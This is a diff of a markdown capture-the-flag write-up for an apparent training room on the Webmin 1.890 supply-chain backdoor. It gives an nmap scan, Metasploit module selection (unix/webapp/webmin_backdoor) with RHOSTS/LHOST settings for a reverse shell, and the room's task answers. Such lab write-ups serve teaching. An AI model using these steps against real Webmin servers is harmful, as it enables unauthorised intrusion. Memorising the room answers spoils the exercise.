@@ -25,8 +25,9 @@ published: true
 
 ### 1 - Enumerationnmap scan :
 
-> nmap -T4 -A -v -Pn Box-ip
-
+```sh
+$ nmap -T4 -A -v -Pn Box-ip
+```
 Results:
 
 
@@ -51,10 +52,11 @@ One of the attached files of vulnerability is metasploit module that will allow 
 
 using this command:
 
+```sh
+$ msfconsole
+```
 
 
-
-> msfconsole
 
 then search "the exploit name or version"
 
@@ -62,10 +64,10 @@ then search "the exploit name or version"
 
 
 
-then choose > unix/webapp/webmin_backdoor
-
-
-
+then choose 
+```sh
+$ unix/webapp/webmin_backdoor
+```
 
 
 
@@ -73,11 +75,11 @@ then choose > unix/webapp/webmin_backdoor
 
 > RHOSTS : Box-ip
 
-RPORT: Box-port
+>RPORT: Box-port
 
-LHOST: Your-ip
+>LHOST: Your-ip
 
-SSL : 1
+>SSL : 1
 
 
 ### 3- Reverse shell
@@ -101,26 +103,16 @@ Task 2 -Discovering the Lay of the Land :
 From Nmap results we can find all our answers .....
 
 Answers: 
-
-
-
 `2-Webmin`
-
 `3-1.890`
-
 `4- from cert bellow figure it out`
-
 ### Task 3 - learning to fly:
 Just explore Attackerkb then we will be able to answer the following "important to copy directly from Attackerkb site 
 
 Answers: 
-
-`3 1.890 
-
+`3 1.890` 
 `4 supply chain`
- 
-`5 aug172019`
-
+ `5 aug172019`
 `6 githubfileinthetitle`
 
 
